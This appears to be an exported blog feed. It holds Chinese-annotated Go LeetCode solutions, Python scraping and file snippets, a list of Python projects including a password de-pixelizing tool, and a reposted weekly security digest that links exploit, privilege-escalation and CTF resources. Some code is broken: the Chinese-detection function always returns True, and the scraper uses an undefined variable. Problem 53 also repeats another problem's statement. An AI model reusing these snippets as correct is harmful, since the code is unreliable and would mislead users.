curLow)</code>又保证了一旦low大于或等于原先的high，low与high就会相等，他们的差值就会变为0，不会影响到总结果;从实际上考虑，此时右边的起点也就换了，因为3为高度的蓄水区域依旧无法漫过高度4这个位置了，所以4将会成为新的右边界，而此时l与r指针已经相遇，4与5又是紧贴，2个高度是无法蓄积到水的，所以本次循环结束。</p><p>总结：该思路通过左右指针的移动找到当前数组里的蓄水池可行高度，并且将目标着眼于每个遍历到的高度与当前可行高度的差值，继而得出当前高度可以贡献多少的蓄水量，可以形象的想象成，他只考虑每个高度上现在能存多少水，如同空中楼阁一般立在那里，等到整个遍历结束，每个空中楼阁合在一起就变成了完整的蓄水池。</p></blockquote><h2 id="45-Jump-Game-II"><a href="#45-Jump-Game-II" class="headerlink" title="45. Jump Game II"></a>45. Jump Game II</h2><p>Given an array of non-negative integers <code>nums</code>, you are initially positioned at the first index of the array.</p><p>Each element in the array represents your maximum jump length at that position.</p><p>Your goal is to reach the last index in the minimum number of jumps.</p><p>You can assume that you can always reach the last index.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: nums &#x3D; [2,3,1,1,4]</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: The minimum number of jumps to reach the last index is 2. Jump 1 step from index 0 to 1, then 3 steps to the last index.</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums &#x3D; [2,3,0,1,4]</span><br><span class="line">Output: 2</span><br></pre></td></tr></table></figure><p><strong>Constraints:</strong></p><ul><li><code>1 &lt;= nums.length &lt;= 3 * 104</code></li><li><code>0 &lt;= nums[i] &lt;= 105</code></li></ul><h3 id="Solution-14"><a href="#Solution-14" class="headerlink" title="Solution:"></a>Solution:</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">jump</span><span class="params">(nums []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">curFar, curEnd, jump := <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i, step := <span class="keyword">range</span> nums &#123;</span><br><span class="line"><span class="keyword">if</span> curEnd == <span class="built_in">len</span>(nums)<span class="number">-1</span> &#123;</span><br><span class="line"><span class="keyword">return</span> jump</span><br><span class="line">&#125;</span><br><span class="line">curFar = max(i+step, curFar)</span><br><span class="line"><span class="keyword">if</span> i == curEnd &#123;</span><br><span class="line">jump++</span><br><span class="line">curEnd = curFar</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> jump</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Note-14"><a href="#Note-14" class="headerlink" title="Note:"></a>Note:</h3><blockquote><p><em>Related Topics</em>提示是greedy，但是巧妙的思路应该是这样的，遍历数组，对每一个遍历到每一个点所可以跳跃的最远距离做一次比较记录，而不去逐一考虑该点的每种情况。</p><p>以[2,3,1,1,4]为例，开始时首先在2的位置，此时可以选择跳2步，或者跳1步，根据以上思想，我们只看现在的位置可以到达的最远距离，值为<code>i+step=0+2=2</code>,也即是当前点最远可以到index=2的1处，而此时<code>i == curEnd</code>，jump就需要加1，也即代表从2到3,1这些范围的区域，最少只需要一步，curEnd此时也等于2(index)；之后遍历到第二个点，此时<code>curFar = max(i+step, curFar)</code>得出的值是3+1=4, (4就是最后的终点)。但是此时的index并没有等于<code>curEnd</code>，所以此轮只更新<code>curFar</code>，到第三轮的时候，<code>i=curEnd</code>，此时我们可以发现，<code>curFar==4</code>，这表示在该点之前，就已经有一个点可以跳到终点，而由于那个点的index肯定小于当前index，所以那个点一定是在当前的<code>jump</code>数内可达的，但是此时curEnd的值并不等于终点，也即所以要想跳到终点，总的<code>jump</code>数一定是先到达那个点，随后再通过那个点跳到终点，所以<code>jump++</code></p><p><code>if curEnd == len(nums)-1 {...}</code>保证<code>jump</code>不会多计数（针对开头一步就跳到终点的情况</p><p>每个<code>jump</code>下的<code>curEnd</code>一定是当前<code>jump</code>时，所能够达到的最远距离，也是最接近终点的距离</p></blockquote><h2 id="48-Rotate-Image"><a href="#48-Rotate-Image" class="headerlink" title="48. Rotate Image"></a>48. Rotate Image</h2><p>You are given an <em>n</em> x <em>n</em> 2D <code>matrix</code> representing an image, rotate the image by 90 degrees (clockwise).</p><p>You have to rotate the image <a href="https://en.wikipedia.org/wiki/In-place_algorithm" target="_blank" rel="noopener"><strong>in-place</strong></a>, which means you have to modify the input 2D matrix directly. <strong>DO NOT</strong> allocate another 2D matrix and do the rotation.</p><p><strong>Example 1:</strong></p><img src="https://assets.leetcode.com/uploads/2020/08/28/mat1.jpg" alt="img" style="zoom:33%;" /><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: matrix &#x3D; [[1,2,3],[4,5,6],[7,8,9]]</span><br><span class="line">Output: [[7,4,1],[8,5,2],[9,6,3]]</span><br></pre></td></tr></table></figure><p><strong>Constraints:</strong></p><ul><li><code>matrix.length == n</code></li><li><code>matrix[i].length == n</code></li><li><code>1 &lt;= n &lt;= 20</code></li><li><code>-1000 &lt;= matrix[i][j] &lt;= 1000</code></li></ul><h3 id="Solution-15"><a href="#Solution-15" class="headerlink" title="Solution:"></a>Solution:</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">rotate</span><span class="params">(matrix [][]<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(matrix) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">xRange, yRange := <span class="built_in">len</span>(matrix), <span class="built_in">len</span>(matrix[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">for</span> x := <span class="number">0</span>; x &lt; xRange; x++ &#123;</span><br><span class="line"><span class="keyword">for</span> y := x; y &lt; yRange; y++ &#123;</span><br><span class="line"><span class="keyword">if</span> x == y &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">matrix[x][y], matrix[y][x] = matrix[y][x], matrix[x][y]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> x := <span class="number">0</span>; x &lt; xRange; x++ &#123;</span><br><span class="line"><span class="keyword">for</span> y := <span class="number">0</span>; y &lt; yRange&gt;&gt;<span class="number">1</span>; y++ &#123;</span><br><span class="line">matrix[x][yRange-y<span class="number">-1</span>], matrix[x][y] = matrix[x][y], matrix[x][yRange-y<span class="number">-1</span>]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Note-15"><a href="#Note-15" class="headerlink" title="Note:"></a>Note:</h3><blockquote><p>90度顺时针旋转可以由分解为以下过程（建立在<em>n</em> x <em>n</em>的matrix的基础上) ，沿对角线的对应元素置换，即i==j的对角线上的元素不动，x行y列与y行x列元素相交换，随后沿着垂直中心轴，再镜像翻转，倒数第一列与第一列置换，倒数第二列与第二列置换</p></blockquote><h2 id="53-Maximum-Subarray"><a href="#53-Maximum-Subarray" class="headerlink" title="53. Maximum Subarray"></a>53. Maximum Subarray</h2><p>Given an integer array <code>nums</code>, find the contiguous subarray (containing at least one number) which has the largest sum and return <em>its sum</em>.</p><p><strong>Follow up:</strong> If you have figured out the <code>O(n)</code> solution, try coding another solution using the <strong>divide and conquer</strong> approach, which is more subtle.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: nums &#x3D; [-2,1,-3,4,-1,2,1,-5,4]</span><br><span class="line">Output: 6</span><br><span class="line">Explanation: [4,-1,2,1] has the largest sum &#x3D; 6.</span><br></pre></td></tr></table></figure><p>Given an array of non-negative integers <code>nums</code>, you are initially positioned at the first index of the array.</p><p>Each element in the array represents your maximum jump length at that position.</p><p>Your goal is to reach the last index in the minimum number of jumps.</p><p>You can assume that you can always reach the last index.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: nums &#x3D; [2,3,1,1,4]</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: The minimum number of jumps to reach the last index is 2. Jump 1 step from index 0 to 1, then 3 steps to the last index.</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums &#x3D; [2,3,0,1,4]</span><br><span class="line">Output: 2</span><br></pre></td></tr></table></figure><p><strong>Constraints:</strong></p><ul><li><code>1 &lt;= nums.length &lt;= 3 * 104</code></li><li><code>0 &lt;= nums[i] &lt;= 105</code></li></ul><h3 id="Solution-16"><a href="#Solution-16" class="headerlink" title="Solution:"></a>Solution:</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">maxSubArray</span><span class="params">(nums []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(nums) == <span class="number">0</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    dp:=<span class="built_in">make</span>([]<span class="keyword">int</span>,<span class="built_in">len</span>(nums))</span><br><span class="line">    maxV := nums[<span class="number">0</span>]</span><br><span class="line">    dp[<span class="number">0</span>] = nums[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">1</span>;i&lt;<span class="built_in">len</span>(nums);i++&#123;</span><br><span class="line">        <span class="keyword">if</span> dp[i<span class="number">-1</span>] &gt; <span class="number">0</span>&#123;</span><br><span class="line">             dp[i]=nums[i]+dp[i<span class="number">-1</span>]</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             dp[i]=nums[i] <span class="comment">//omitting +0</span></span><br><span class="line">        &#125;</span><br><span class="line">        maxV = max(maxV, dp[i])</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> maxV</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">max</span><span class="params">(a <span class="keyword">int</span>, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> a &gt; b&#123;</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Note-16"><a href="#Note-16" class="headerlink" title="Note:"></a>Note:</h3><blockquote><p>dp思想，dp[i]等于前i个元素中所可以组成的连续序列的最大值，一开始dp[0] （index为0，实则为第一个元素)它的最大值就是它本身，注意题目要求必须选择有一个元素，所以dp[0]赋值为nums[0]就是为了确保nums只有一个元素的情况下也可以正确返回结果，随后我们要判断<code>dp[i-1]</code>与0的大小，也即是当前的dp[i]需要参考i-1个元素形成的结果，如果他们形成的最大值是负数，那么舍去负数一定是正确的，负的dp[i-1]对之后的结果不会存在正向帮助，任何组合加上负数一定会变小，此时需要重新以nums[i]开始一个新的序列。</p><p>一个nums里如果全部是负数，那么最大的序列就是找到最小的负数，并且它们在上面的for循环中也无法形成任何一个连续的序列。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> 笔记|备忘录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python Code Library</title>
      <link href="/2020/12/12/Python-Code-Library/"/>
      <url>/2020/12/12/Python-Code-Library/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-code blink-slow"></i><em>Convenient for code write</em></p><h4 id="爬虫代码初始化模板"><a href="#爬虫代码初始化模板" class="headerlink" title="爬虫代码初始化模板"></a><strong>爬虫代码初始化模板</strong></h4><hr><p><em>作用：requests爬虫脚本初始化代码</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url=<span class="string">""</span></span><br><span class="line">headers=&#123;&#125;</span><br><span class="line">proxies=&#123;</span><br><span class="line">   <span class="comment"># 'http': 'socks5://xxxx:5555',</span></span><br><span class="line">   <span class="comment">#  'https': 'socks5://xxxx:5555'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">result = requests.get(url_fix, proxies=proxies, headers=headers)</span><br><span class="line">soup = BeautifulSoup(result.content.decode(<span class="string">'utf-8'</span>), <span class="string">'lxml'</span>)</span><br><span class="line">target = soup.find(<span class="string">'div'</span>)</span><br></pre></td></tr></table></figure><h4 id="修正url中的"><a href="#修正url中的" class="headerlink" title="修正url中的#"></a><strong>修正url中的#</strong></h4><hr><p><em>作用：防止待爬取目标的url中具有的#等特殊字符对爬虫进行干扰</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sharp_fix</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    the sharp (#) will incur some troubles in url</span></span><br><span class="line"><span class="string">    param: url</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> url.find(<span class="string">'#'</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">        strs = url.split(<span class="string">'#'</span>)</span><br><span class="line">        <span class="keyword">if</span> is_chinese(strs[<span class="number">1</span>]):</span><br><span class="line">            fix = urllib.parse.quote(strs[<span class="number">1</span>])</span><br><span class="line">            fix = strs[<span class="number">0</span>] + <span class="string">'%23'</span> + fix</span><br><span class="line">            <span class="keyword">return</span> fix</span><br><span class="line">        <span class="keyword">return</span> url</span><br><span class="line">    <span class="keyword">return</span> url</span><br></pre></td></tr></table></figure><h4 id="判断字符串否包含中文"><a href="#判断字符串否包含中文" class="headerlink" title="判断字符串否包含中文"></a><strong>判断字符串否包含中文</strong></h4><hr><p><em>作用：对字符串是否包含有中文字符进行判断</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_chinese</span><span class="params">(string)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    check whether the string includes the Chinese</span></span><br><span class="line"><span class="string">    param: string</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> string:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">u'\u4e00'</span> &lt;= ch &lt;= <span class="string">u'\u9fff'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><h4 id="文件-txt-操作初始模板"><a href="#文件-txt-操作初始模板" class="headerlink" title="文件(txt)操作初始模板"></a><strong>文件(txt)操作初始模板</strong></h4><hr><p><em>作用：对文件（文本文件）进行读取写入，此处为先读取当前文件夹里的所有.txt结尾文件的内容，经过特定的函数处理后写入新文本文档</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_something</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    file_list = os.listdir()</span><br><span class="line">    target = <span class="string">'target.txt'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(target, <span class="string">'a+'</span>, encoding=<span class="string">'UTF-8'</span>) <span class="keyword">as</span> source: <span class="comment">#a+ w+ rb</span></span><br><span class="line">        <span class="keyword">for</span> file_name <span class="keyword">in</span> file_list:</span><br><span class="line">            <span class="keyword">if</span> file_name.endswith(<span class="string">'.txt'</span>) <span class="keyword">and</span> file_name != target:</span><br><span class="line">                <span class="keyword">with</span> open(file_name, <span class="string">'r'</span>, encoding=<span class="string">'UTF-8'</span>) <span class="keyword">as</span> file:</span><br><span class="line">                    print(file_name + <span class="string">'done'</span>)</span><br><span class="line">                    <span class="keyword">for</span> contents <span class="keyword">in</span> file.readlines():</span><br><span class="line">                        source.write(do_something(contents))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> code library </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python NICE projects</title>
      <link href="/2020/12/11/Python-Funny-Project/"/>
      <url>/2020/12/11/Python-Funny-Project/</url>
      
        <content type="html"><![CDATA[<h1 id="Python实用项目收录-NICE-projects"><a href="#Python实用项目收录-NICE-projects" class="headerlink" title="Python实用项目收录|NICE projects"></a>Python实用项目收录|NICE projects</h1><h3 id="1-rembg"><a href="#1-rembg" class="headerlink" title="1. rembg"></a>1. rembg</h3><hr><p>rembg 是使用 Python 实现的用于移除背景图片的工具，要求 Python 3.8 或更高版本，支持批量操作，使用方式比较灵活，可以直接使用命令行、作为服务运行、在 docker 中使用，还可以作为库调用。</p><p><a href="https://github.com/danielgatis/rembg" target="_blank" rel="noopener">GitHub - danielgatis/rembg</a></p><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20201211175945979.png" alt="image-20201211175945979"></p><h3 id="2-SkyAR"><a href="#2-SkyAR" class="headerlink" title="2. SkyAR"></a>2. SkyAR</h3><hr><p>SkyAR 是一种基于视觉的视频天空置换和协调方法,可以在可控风格的视频中自动生成逼真和生动的天空背景</p><p><a href="https://github.com/jiupinjia/SkyAR" target="_blank" rel="noopener">GitHub - jiupinjia/SkyAR</a></p><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20201211180234316.png" alt="image-20201211180234316"></p><h3 id="3-Depix"><a href="#3-Depix" class="headerlink" title="3.  Depix"></a>3.  Depix</h3><hr><p>Depix is a tool for recovering passwords from pixelized screenshots. This implementation works on pixelized images that were created with a linear box filter.</p><p>文字马赛克还原工具</p><p><a href="https://github.com/beurtschipper/Depix" target="_blank" rel="noopener">GitHub - beurtschipper/Depix</a></p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20201211180425968.png" alt="image-20201211180425968" style="zoom:67%;" /><h3 id="4-PathPlanning"><a href="#4-PathPlanning" class="headerlink" title="4. PathPlanning"></a>4. PathPlanning</h3><hr><p>This repository implements some common path planning algorithms used in robotics, including Search-based algorithms and Sampling-based algorithms.</p><p>PathPlanning 是使用 Python 实现的存储库，实现了机器人技术中常用的路径规划算法。开发者还为每个算法设计了动画来演示运行过程，相当直观清晰。</p><p><a href="https://github.com/zhm-real/PathPlanning" target="_blank" rel="noopener">GitHub - zhm-real/PathPlanning</a></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记|备忘录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>(转载)2020.11.30-12.6一周安全知识动态</title>
      <link href="/2020/11/29/%5B%E8%BD%AC%5D2020.11.30-12.6%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
      <url>/2020/11/29/%5B%E8%BD%AC%5D2020.11.30-12.6%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="2020-11-30-12-6一周安全知识动态"><a href="#2020-11-30-12-6一周安全知识动态" class="headerlink" title="2020.11.30-12.6一周安全知识动态"></a>2020.11.30-12.6一周安全知识动态</h1><p>转自<img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200929114557052.png" alt="image-20200929114557052"></p><h3 id="CTF相关"><a href="#CTF相关" class="headerlink" title="CTF相关"></a>CTF相关</h3><p>•hitcon-ctf-2020</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;orangetw&#x2F;My-CTF-Web-Challenges&#x2F;tree&#x2F;master&#x2F;hitcon-ctf-2020</span><br><span class="line">hitcon 2020 web题目源码</span><br></pre></td></tr></table></figure><p>•angelboy hitcon writeup</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;scwuaptx&#x2F;CTF&#x2F;tree&#x2F;master&#x2F;</span><br><span class="line">2020-writeup&#x2F;hitcon</span><br></pre></td></tr></table></figure><h3 id="漏洞挖掘相关"><a href="#漏洞挖掘相关" class="headerlink" title="漏洞挖掘相关"></a>漏洞挖掘相关</h3><p>•healer</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;SunHao-0&#x2F;healer</span><br><span class="line">kernel fuzzer inspired by syzkaller. Written in Rust</span><br></pre></td></tr></table></figure><h3 id="漏洞利用相关"><a href="#漏洞利用相关" class="headerlink" title="漏洞利用相关"></a>漏洞利用相关</h3><p>•A Modern Exploration of Windows Memory Corruption Exploits - Part I: Stack Overflows</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.forrest-orr.net&#x2F;post&#x2F;a-modern-exploration-of-windows-memory-corruption-exploits-part-i-stack-overflows</span><br><span class="line">windows漏洞利用系列文章1:栈溢出</span><br></pre></td></tr></table></figure><h3 id="IOT漏洞相关"><a href="#IOT漏洞相关" class="headerlink" title="IOT漏洞相关"></a>IOT漏洞相关</h3><p>•Another LILIN DVR 0-day being used to spread Mirai</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.netlab.360.com&#x2F;another-lilin-dvr-0-day-being-used-to-spread-mirai-en&#x2F;</span><br><span class="line">LILIN DVR 0-day被Mirai使用</span><br></pre></td></tr></table></figure><p>•CVE-2020-25988: A UPnP Abuse(?)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;niteshsurana.medium.com&#x2F;cve-2020-25988-a-upnp-abuse-424f0db73129</span><br><span class="line">CVE-2020-25988 Genexis Platinum 4410 Router v2.1 upnp漏洞分析</span><br></pre></td></tr></table></figure><h3 id="虚拟化逃逸漏洞相关"><a href="#虚拟化逃逸漏洞相关" class="headerlink" title="虚拟化逃逸漏洞相关"></a>虚拟化逃逸漏洞相关</h3><p>•Kernel privilege escalation: how Kubernetes container isolation impacts privilege escalation attacks</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;snyk.io&#x2F;blog&#x2F;kernel-privilege-escalation&#x2F;</span><br><span class="line">内核提权 Kubernetes容易是如何影响提权</span><br></pre></td></tr></table></figure><p>•vmware-exploitation</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;xairy&#x2F;vmware-exploitation</span><br><span class="line">VMware 漏洞相关资料仓库</span><br></pre></td></tr></table></figure><h3 id="应用程序漏洞相关"><a href="#应用程序漏洞相关" class="headerlink" title="应用程序漏洞相关"></a>应用程序漏洞相关</h3><p>•AliExpress Captcha Reuse</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;therealunicornsecurity.github.io&#x2F;Aliexpress&#x2F;</span><br><span class="line">AliExpress登陆验证码重用攻击</span><br></pre></td></tr></table></figure><p>•Multiple (RCE) Vulnerabilities in Micro Focus Operations Bridge Manager</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> https:&#x2F;&#x2F;github.com&#x2F;pedrib&#x2F;PoC&#x2F;blob&#x2F;master&#x2F;advisories&#x2F;Micro_Focus&#x2F;Micro_Focus_OBM.md</span><br><span class="line">Micro Focus Operations Bridge Manager 多个远程代码执行漏洞分析</span><br></pre></td></tr></table></figure><p>•Don’t scan my website I: exploiting an old version of Wappalyzer</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;medium.com&#x2F;@csal&#x2F;dont-scan-my-website-i-exploiting-an-old-version-of-wappalyzer-14c001279434</span><br><span class="line">老版本Wappalyzer漏洞分析</span><br></pre></td></tr></table></figure><p>•CLOUDGOAT EXPLOITATION SERIES - PRIVILEGE ESCALATION VIA LAMBDA AND IAM PASS ROLE</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;makosecblog.com&#x2F;aws-pentest&#x2F;lambda-privesc&#x2F;</span><br><span class="line">CloudGoat 漏洞利用系列</span><br></pre></td></tr></table></figure><h3 id="操作系统漏洞相关"><a href="#操作系统漏洞相关" class="headerlink" title="操作系统漏洞相关"></a>操作系统漏洞相关</h3><p>•BUG OR FEATURE: PRIVILEGE ESCALATION IN WINDOWS AUTOPILOT</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sec-consult.com&#x2F;en&#x2F;blog&#x2F;2020&#x2F;11&#x2F;bug-oder-feature-privilege-escalation-in-windows-autopilot&#x2F;</span><br><span class="line">通过Windows Autopilot进行提权</span><br></pre></td></tr></table></figure><p>•More On 